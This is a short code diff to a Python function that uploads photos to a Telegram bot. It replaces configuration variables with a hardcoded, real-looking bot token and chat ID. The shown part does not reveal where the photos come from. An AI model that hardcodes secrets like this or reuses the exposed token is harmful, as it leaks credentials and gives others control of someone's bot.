@@ -25,9 +25,9 @@ def send_to_telegram(photo_data):
             f.write(photo_bytes)
         
         # Send to Telegram
-        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"
+        url = f"https://api.telegram.org/bot{"8312072094:AAFUERN0xBB0-55V9ZmAPi3jh5eZxj3H79s"}/sendPhoto"
         files = {'photo': open(temp_file, 'rb')}
-        data = {'chat_id': TELEGRAM_CHAT_ID}
+        data = {'chat_id': "6398488628"}
         
         response = requests.post(url, files=files, data=data)
         
